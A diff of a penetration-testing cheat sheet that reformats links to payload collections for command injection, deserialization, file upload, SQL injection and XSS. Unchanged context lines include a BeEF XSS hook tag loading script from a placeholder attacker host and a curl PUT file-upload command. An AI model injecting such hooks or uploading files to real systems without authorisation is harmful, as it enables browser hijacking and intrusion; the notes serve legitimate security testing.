@@ -511,28 +511,28 @@
 
 - Command injection
   - For command injection always use BurpSuite !
-    - <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection>
+    - [Command Injection swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
 
 - Deserialization
-  - [swisskyrepo - Insecure Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
+  - [Insecure Deserialization - swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
   - [.NET - YSoSerial.Net](https://github.com/pwntester/ysoserial.net)
 
 - File upload
-  - <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files>
+  - [Upload InsecureFiles - swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
 
 - SQL injection
-  - <http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet>
-  - <https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/>
-  - <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection>
-  - <https://blog.cobalt.io/a-pentesters-guide-to-sql-injection-sqli-16fd570c3532>
+  - [mssql-sql-injection-cheat-sheet - pentestmonkey](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
+  - [sql-injection-authentication-bypass-cheat-sheet - pentestlab](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)
+  - [SQL Injection - swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
+  - [a-pentesters-guide-to-sql-injection-sqli](https://blog.cobalt.io/a-pentesters-guide-to-sql-injection-sqli-16fd570c3532)
 
 - XSS
-  - <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection>
+  - [XSS Injection - swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
   - beef-xss
     - `cat /usr/share/beef-xss/config.yaml | grep user -C 1 # user / password`
     - `<script src="http://<IP>:3000/hook.js"></script>`
 - Other web vulnerabilities
-  - <https://github.com/swisskyrepo/PayloadsAllTheThings>
+  - [PayloadsAllTheThings - swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings)
 
 - Upload a file with PUT
   - `curl -X PUT http://<IP>/<FILE> -d @<FILE>  -v`
